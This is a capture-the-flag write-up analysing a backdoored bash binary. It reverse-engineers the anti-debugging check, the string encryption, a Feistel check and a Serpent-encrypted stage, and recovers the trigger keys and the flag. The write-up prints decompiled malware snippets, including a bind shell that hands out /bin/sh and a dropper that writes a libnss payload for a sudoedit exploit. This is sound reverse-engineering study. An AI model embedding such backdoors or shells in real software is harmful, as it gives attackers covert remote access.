# Aero CTF 2021 - BashD00r (500 pts)

This is the second challenge I was able to solve, and the hardest one. The
task is below:  
> There seems to be something wrong with our bash.  
>  
> Can you see if anyone has entered the backdoor?  
>  
> bash.7z

So we are given a archive, which contains a "bash" binary. This binary was
backdoored, so we need to find it to get the flag.

## Bash backdoor, Pt. I

While opening the file on IDA, the entry point isn't disassembled correctly.
The entrypoint is placed straddling the ".text" and the ".data" section. After
defining the instructions on the data section, we can locate the "main"
function:  
```  
_data           segment dword public 'DATA' use64  
.data:000000000001ECA2                 assume cs:_data  
.data:000000000001ECA2                 ;org 1ECA2h  
.data:000000000001ECA2                 db  1Eh  
.data:000000000001ECA3                 db 0FAh  
.data:000000000001ECA4 ;
---------------------------------------------------------------------------  
.data:000000000001ECA4                 xor     ebp, ebp  
.data:000000000001ECA6                 mov     r9, rdx  
.data:000000000001ECA9                 pop     rsi  
.data:000000000001ECAA                 mov     rdx, rsp  
.data:000000000001ECAD                 and     rsp, 0FFFFFFFFFFFFFFF0h  
.data:000000000001ECB1                 push    rax  
.data:000000000001ECB2                 push    rsp  
.data:000000000001ECB3                 lea     r8, __libc_csu_fini  
.data:000000000001ECBA                 lea     rcx, __libc_csu_init  
.data:000000000001ECC1                 lea     rdi, main  
.data:000000000001ECC8                 call    cs:off_11EF38  
.data:000000000001ECCE                 hlt  
.data:000000000001ECCF  
```  
The main function is huge, thanks to inlined static functions. But we can
quickly see that the main function belongs to the "shell.c" file thanks to
some debug function, that look like this:  
```  
.data:00000000000206A5                 call    set_default_locale  
.data:00000000000206AA                 call    getuid_0  
.data:00000000000206AF                 mov     ebx, eax  
.data:00000000000206B1                 cmp     eax, cs:cur_user__uid  
.data:00000000000206B7                 jz      short loc_20731  
.data:00000000000206B9                 mov     rdi, cs:cur_user__username  
.data:00000000000206C0                 test    rdi, rdi  
.data:00000000000206C3                 jz      short loc_206D6  
.data:00000000000206C5                 mov     edx, 1642  
.data:00000000000206CA                 lea     rsi, aShellC    ; "shell.c"  
.data:00000000000206D1                 call    print_free  
```  
So I downloaded the bash 5.1 source tarball (the version can be identified
easily thanks to program's strings), and looked at this file. But the
corresponding snippet in bash source  
```c

u = getuid ();  
 if (current_user.uid != u)  
   {  
     FREE (current_user.user_name);

```  
is located at line 1292 instead of 1642. So we can tell that the binary has
been recompiled from the source with the backdoor injected. I spent some time
to identify the file's function, and came across this function that doesn't
have anything looking like this in its sources:  
```c

v26 = __readfsqword(0x28u);  
 v0 = (_QWORD *)sh_malloc(4096LL, "shell.c", 587LL);  
 v0[511] = 0LL;  
 memset(  
   (void *)((unsigned __int64)(v0 + 1) & 0xFFFFFFFFFFFFFFF8LL),  
   0,  
   8LL * (((unsigned int)v0 - (((_DWORD)v0 + 8) & 0xFFFFFFF8) + 4096) >> 3));  
 *v0 = 0xDBEF3510A9ECE437LL;  
 v0[1] = 0xB557D3ED25ADEB3FLL;  
 *((_BYTE *)v0 + 16) = 40;  
 decrypt_string(v0, 17);  
 v1 = fopen_0(v0, "r");  
 if ( !v1 )  
   exit_0(0LL);  
 v2 = v1;  
 v3 = sh_malloc(1024LL, "shell.c", 645LL);  
 v4 = 8;

```  
This function is called as an init vector by `__libc_csu_init`, before `main`
function is called. The backdoor checks if bash is being debugged by looking
for TracerPid field in `/proc/self/status`. The strings are encrypted with a
simple algorithm, I reimplemented in Python.  
```python

def decryptbuf(s):  
   outpt = b""  
   key = 24  
   for i in range(len(s)):  
       outpt += bytes([s[i] ^ key])  
       key = (4*key + 52) % 243  
   return outpt

```  
Then it checks if `/home/anon/.profile` file exists, and exits if it's not the
case. After that, the backdoor tries to read 32 bytes from
`/proc/self/fd/777`.

Now, the real fun begins.

## Custom crypto and Feistel ciphers

The contents of /proc/self/fd/777 is transformed by some encryption algorithm,
and then checked against the ciphertext. The decompiled algorithm looks like
this:  
```c

mysterious_array[0] = 0xE9B554BCBF7A0351LL;  
mysterious_array[1] = 0x200A845B757AFF88LL;  
mysterious_array[2] = 0x392848A34339A3EELL;  
mysterious_array[3] = 0x21F8E1C664355C7CLL;  
v9 = strlen((const char *)buffd) + 1;  
bufread = (char *)buffd;  
// snipped some uninteresting parts  
count = 0LL;  
while ( 1 )  
{  
   v17 = count;  
   if ( strlen(bufread) <= count )  
       break;  
   seed1 = *(_DWORD *)&bufread[count];  
   seed2 = *(unsigned int *)&bufread[count + 4];  
   watconst2[0] = 1361583988;  
   watconst2[1] = -1740780829;  
   watconst2[2] = -1681248625;  
   watconst2[3] = -1992688973;  
   j_1 = 0;  
   while ( 1 )  
   {  
       v14 = seed1 + watconst2[j_1 & 3] + seed2 + j_1 + (((unsigned int)seed2 >> 8) ^ ((_DWORD)seed2 << 6));  
       ++j_1;  
       seed1 = seed2;  
       if ( j_1 == 48 )  
       break;  
       seed2 = v14;  
   }  
   count += 8LL;  
   if ( mysterious_array[v17 / 8] != (seed2 << 32) + v14 )  
   {  
       print_free(watconst, "shell.c", 563LL);  
       goto LABEL_10;  
   }  
}

```  
By looking at the final check `mysterious_array[v17 / 8] != (seed2 << 32) +
v14`, we can see that fhe first 32 upper bytes of the "mysterious_array" are
the "state2", untouched, while the 32 lower bytes are computed with the
"state2".

The encryption algorithm does 48 rounds of the following transformation
(reimplemented in Python), where j is the round number:

```python

def do_feistel_pass(j, seed1, seed2):  
   tmp = (seed1 + watconst[j & 3] + seed2 + j + ((seed2 >> 8) ^ ((seed2 << 6)
& 0xffffffff))) & 0xffffffff  
   return (seed2, tmp)

def encrypt_data(x):  
   seed1, seed2 = struct.unpack("<II", x[0:8])  
   for j in range(48):  
       seed1, seed2 = do_feistel_pass(j, seed1, seed2)  
   return (seed1, seed2)

```  
This algorithm can be inverted, since we know seed2 thank to the way it's
compared to the "mysterious_array". We just need to take care of additions,
which are truncated to 32 bits, which discards the additions overflow. So, the
decryption function looks like this:  
```python

def undo_feistel_pass(j, seed2, tmp):  
   while True:  
       blup = watconst[j & 3] + seed2 + j + ((seed2 >> 8) ^ ((seed2 << 6) & 0xffffffff))  
       pass1 = tmp - blup  
       if pass1 > 0:  
           break  
       tmp += 0x100000000  
   return (pass1, seed2)

def decrypt_data(x):  
   seed2, tmp = ((x >> 32), x & 0xffffffff)  
   for i in range(47, -1, -1):  
       seed2, tmp = undo_feistel_pass(i, seed2, tmp)  
   return struct.pack("<II", seed2, tmp)

```  
So, after running it on our "mysterious_array" variable:  
```python

bufd = b""  
for i in range(0, 32, 8):  
   bufd += do_unhash_block(mysterious_array[i >> 3])

```  
We get the string that unlocks the "first" backdoor, and will serve as a key
for the next step: `eY3HmR6knwflbc1nsq0ILP9KZYQ8DTn`.

The next steps decrypts another ELF file with some sort of Salsa20 (thanks the
magic consts), but I gave up analyzing it and just dumped the decrypted bin
with gdb from a coredump after having patched the binary with int3 instruction
after.

## Analysis of the second stage

The second stage uses the same trick used by the "bash" binary, which places a
part of entrypoint on the ".data" section. The main function just calls the
decryption function with argv[1]. The decryption function looks like this:  
```c

__int64 __fastcall do_the_hustle(char *serial)  
{  
 __m128i *key; // rbp  
 _QWORD *v2; // r12  
 _QWORD *v3; // r13

 serial[31] = 0;  
 key = (__m128i *)calloc_0(4096LL, 1LL);  
 *key = _mm_load_si128(xmmword_5060);  
 key->m128i_i8[0] ^= 0x18u;  
 key->m128i_i8[1] ^= 0x94u;  
 key->m128i_i8[2] ^= 0x9Eu;  
 key->m128i_i8[3] ^= 0xC6u;  
 key->m128i_i8[4] ^= 0x73u;  
 key->m128i_i8[5] ^= 0x1Au;  
 key->m128i_i8[6] ^= 0x9Cu;  
 key->m128i_i8[7] ^= 0xBEu;  
 key->m128i_i8[8] ^= 0x53u;  
 key->m128i_i8[9] ^= 0x8Du;  
 key->m128i_i8[10] ^= 0x82u;  
 key->m128i_i8[11] ^= 0x56u;  
 key->m128i_i8[12] ^= 0x99u;  
 key->m128i_i8[13] ^= 0xB2u;  
 key->m128i_i8[14] ^= 0x23u;  
 key->m128i_i8[15] ^= 0xC0u;  
 v2 = (_QWORD *)malloc_0();  
 v3 = (_QWORD *)malloc_0();  
 serpent_encrypt(serial, (__int64)key, (__int64)v2, 0x10u);  
 if ( *v2 ^ 0x9601AAF388AB0192LL | v2[1] ^ 0x2127591BB4E06735LL )  
   return send_backdoor_status(0);  
 serpent_encrypt((_DWORD *)serial + 4, (__int64)key, (__int64)v3, 0x10u);  
 if ( *v3 ^ 0x582C4E2FDC6C7226LL | v3[1] ^ 0xC00B8862110C7A9DLL )  
   return send_backdoor_status(0);  
 send_backdoor_status(1);  
 free_0(v2);  
 return free_0(v3);  
}

```  
The Serpent encryption key is just "Dh1IuM7SV7xgZP8q" with some XOR
obfuscation. The "hard" part was to identify correctly the algorithm, mais
thanks to the secret technique of searching S-Boxes on Google, I came across a
chinese blog (https://ctf.njupt.edu.cn/271.html), that contained the
interesting S-Box

```  
0x03, 0x08, 0x0F, 0x01, 0x0A, 0x06, 0x05, 0x0B, 0x0E, 0x0D`  
```  
This blog gave the CTF challenge's name it was taken from ("Touch of Satan"),
and thanks to my OSINT skills, I found another chinese blog
(https://blog.csdn.net/qq_38867330/article/details/102922423) that identified
it as Serpent.

So I grabbed some ancient Python2 Serpent lib, tweaked it to make it run on
Python 3, and after running  
```python

import serpent  
z = serpent.Serpent(b"Dh1IuM7SV7xgZP8q")  
bin = struct.pack("<QQQQ", 0x9601AAF388AB0192, 0x2127591BB4E06735,
0x582C4E2FDC6C7226, 0xC00B8862110C7A9D)  
print(z.decrypt(bin))

```  
I got the key `0NSlH7m8C91boiGq10NtQKq4aP7mVyJ`

## Bash backdoor Pt. II

Since the previous binary does nothing except sending flag status through a
FIFO pipe, we need to find another part of the backdoor in the bash binary.

After losing time digging into the binary (which probably costed me the first
blood for this challenge ?), I found some `getenv("JAKWEULOD")` in the binary,
that isn't present into official bash source code.

The function doing the getenv is called at the beginning of the
"parse_and_execute", patched to run the backdoor. Let's have a look to the
added code:  
```c

v3 = backdoor_enabled;  
if ( backdoor_enabled )  
 {  
   if ( ~(strlen((const char *)a1) + 1) == ~0x29uLL && !(unsigned
int)memcmp_0(a1, "1+2+3+4+5", 9LL) )  
   {  
     ((void (__fastcall *)(__int64))(v3 + 91))(a1 + 9);  
     v6 = sh_malloc(4096LL, "evalstring.c", 194LL);  
     *(_QWORD *)(v6 + 4088) = 0LL;  
     // v6 = mkfifo path from the other binary, snipped bc noisy string obfu  
     mkfifo_0(v6, 438LL);  
     v9 = open_0(v6, 0LL);  
     buf[0] = 0LL;  
     buf[1] = 0LL;  
     read_0(v9, buf, 1);  
     close_0(v9);  
     print_free(v6, "evalstring.c", 511LL);  
     if ( LOBYTE(buf[0]) == 1 )  
     {  
       xmmword_14F320 = (__int128)_mm_loadu_si128((const __m128i *)(a1 + 9));  
       qword_14F330 = *(_QWORD *)(a1 + 25);  
       dword_14F338 = *(_DWORD *)(a1 + 33);  
       word_14F33C = *(_WORD *)(a1 + 37);  
       byte_14F33E = *(_BYTE *)(a1 + 39);  
       backdoor_activation((const char *)(a1 + 9));  
     }  
}

```  
The backdoor is triggered when entering "1+2+3+4+5" followed by the string we
found before. The `((void (__fastcall *)(__int64))(v3 + 91))(a1 + 9)` function
spawns the decrypted binary we analyzed thanks to a memfd, with the string we
got as a parameter. So we can trigger the code with the command

```  
1+2+3+4+50NSlH7m8C91boiGq10NtQKq4aP7mVyJ  
```

With that, we can reach `backdoor_activation` which call some crypto func with
`0NSlH7m8C91boiGq10NtQKq4aP7mVyJ` as key to decrypt the function which will
check the "JAKWEULOD" variable environment:  
```c

void __fastcall backdoor_activation(const char *key)  
{  
 __int64 v1; // rbp  
 const char *v2; // rax  
 const __m128i *v3; // rbx

 v1 = mmap_0(0LL, 98323, 7, 34, 0, 0);  
 cryptoshit_again((__int64)key, (__int64)&unk_12B000, v1, 98323LL,
strlen(key));  
 v2 = (const char *)getenv("JAKWEULOD");  
 if ( v2 )  
 {  
   v3 = (const __m128i *)v2;  
   if ( ~(strlen(v2) + 1) == ~65LL && ((unsigned int (__fastcall *)(const char
*))(v1 + 143))(v2) == 1 )  
   {  
     kk1 = (__int128)_mm_loadu_si128(v3);  
     xmmword_14F430 = (__int128)_mm_loadu_si128(v3 + 1);  
     xmmword_14F440 = (__int128)_mm_loadu_si128(v3 + 2);  
     unk_14F450 = _mm_loadu_si128(v3 + 3);  
     sub_89675();  
     fork_and_spawn();  
   }  
 }  
 munmap_0(v1, 98323LL);  
}

```

Since I'm lazy, I attempted to patch the binary with an "int3" breakpoint, but
bash sets up its own sighandler and catches int3, so I landed in to the
sighandler func.

To avoid this, I replaced the "int3" by a "jmp $0" (`"\xeb\xfe\"`), and dumped
the content of the allocated buffer after calling the crypto function after
attaching to the process with gdb.

The allocated buffer is called as function to check "JAKWEULOD" contents:
`((unsigned int (__fastcall *)(const char *))(v1 + 143))(v2)`.

The checking algorithm is pretty simple: it does a modular exponentiation on
each char of the variable and check if the results equals a certain value.
Unfortunately the modulus isn't a prime number, but since the modulus is small
we can do dumb bruteforce to determine the correct char:  
```python

def bf_char(n, p, res):  
   selected = -1  
   for i in range(0x10, 0x7f):  
       if pow(i, n, p) == res:  
           if selected == -1:  
               selected = i  
           else:  
               print("Other candidate %d" % i)  
   return selected

```

I was too lazy to make a script to extract the exponent, modulus and the
powmod value so I did by hand (fortunately b33r helps to do boring tasks) to
compute the JAKWEULOD value. So after running the script which looks like
this:

```python

def bf_char(n, p, res):  
   selected = -1  
   for i in range(0x10, 0x7f):  
       if pow(i, n, p) == res:  
           if selected == -1:  
               selected = i  
           else:  
               print("Other candidate %d" % i)  
   return selected

flag = bytearray(b"-"*65)

elts = [  
   (0x7b7bc, 0x3fa, 0x6af18, 4),  
   (0x3fbeb, 0x2a1, 0xd56d, 0xd),  
# snipped  
   (0x3dbca, 0x377, 0x5de6, 0x10)

]

for e in elts:  
   c = bf_char(e[1], e[0], e[2])  
   #print(hex(e[3]))  
   flag[e[3]] = c

print(len(elts))  
print(flag)  
pos = [hex(i) for i in range(len(flag)) if flag[i] == ord("-")]  
print(pos)

```  
we get the correct value for the env var:
`mIB8vFxWAQ5RkO7MXzDKnjTbYIdbwQQbxSyU6XvIoS39zmdKrHHCOevfUt5oBDZh`.

As usual, this value is a key to decrypt the next payload, but once again the
`jmp $0` trick will help us and we can dump the "final" stage:

```c

void fork_and_spawn()  
{  
 __m128i *key; // rbx  
 __int64 v1; // rax  
 _BYTE v2[1648]; // [rsp-1CF8h] [rbp-DD10h] BYREF  
 __int64 v3; // [rsp-1688h] [rbp-D6A0h] BYREF  
 _QWORD v4[5841]; // [rsp-688h] [rbp-C6A0h] BYREF

 while ( &v3 != &v4[-6144] )  
   ;  
 v4[5631] = __readfsqword(0x28u);  
 memcpy_0(v2, &unk_ECB08, 50784);  
 key = (__m128i *)sh_malloc(64LL, "evalstring.c", 401LL);  
 key->m128i_i64[0] = 0LL;  
 key->m128i_i64[1] = 0LL;  
 key[1].m128i_i64[0] = 0LL;  
 key[1].m128i_i64[1] = 0LL;  
 key[2].m128i_i64[0] = 0LL;  
 key[2].m128i_i64[1] = 0LL;  
 key[3].m128i_i64[0] = 0LL;  
 key[3].m128i_i64[1] = 0LL;  
 *key = _mm_load_si128((const __m128i *)&xmmword_14F220);  
 key[1] = _mm_load_si128((const __m128i *)&xmmword_14F230);  
 key[2] = _mm_load_si128((const __m128i *)&xmmword_14F240);  
 key[3] = _mm_load_si128((const __m128i *)&xmmword_14F250);  
 v1 = sh_malloc(50784LL, "evalstring.c", 404LL);  
 cryptoshit_again((__int64)key, (__int64)v2, v1, 50784LL, 64LL);  
 while ( 1 ) // jmp $0 rocks :þ  
   ;  
}

```  
We finally see the end of the tunnel, and dump the dropped ELF with gdb after
attaching to the process.

## Final flash

After having dumped the ELF, we open it on IDA. This time, no weird tricks and
IDA shows us the main function directly. The main function is useless because
it just calls "sudoedit" with shitty arguments.

But remember, init functions can be called by `__libc_csu_init`, and it's the
case here. We have a `setup` function, which does this:  
```c

int __fastcall setup(__int64 a1, __mode_t a2)  
{  
 FILE *s; // [rsp+8h] [rbp-8h]  
 FILE *sa; // [rsp+8h] [rbp-8h]

 mkdir("libnss_X", a2);  
 s = fopen("libnss_X/A .so.2", "w");  
 fwrite(&libData, 1uLL, 0x4080uLL, s);  
 fclose(s);  
 sa = fopen("/tmp/shellbind", "w");  
 fwrite(&shellData, 1uLL, 0x4300uLL, sa);  
 return fclose(sa);  
}

```

Luckily for me, I analyzed the "shellbind" binary, and after seening its main
function:

```c

bind(fd, &addr, 0x10u);  
listen(fd, 0);  
v8 = accept(fd, 0LL, 0LL);  
v9 = recv(v8, buf, 0x28uLL, 0);  
if ( buf[v9 - 1] == 10 )  
 buf[v9 - 1] = 0;  
for ( i = 0; i <= 37; ++i )  
 buf[i] ^= 0x59u;  
if ( !strcmp(buf, &unk_2008) )  
{  
 dup2(v8, 2);  
 dup2(v8, 1);  
 dup2(v8, 0);  
 execve("/bin/sh", 0LL, 0LL);  
}

```  
I found the password of the backdoor:

```python

s =
bytes.fromhex("183C2B36226D603B6861686A616E3F6C69606A6C3B6A60386969616C693B6E6E613A6F6F3F24")

print(bytes([x ^ 0x59 for x in s]))

```

Which gives us the flag: `Aero{49b181387f50935b39a00850b778c66f}`

Original writeup (https://ret2school.github.io/post/bashd00r/).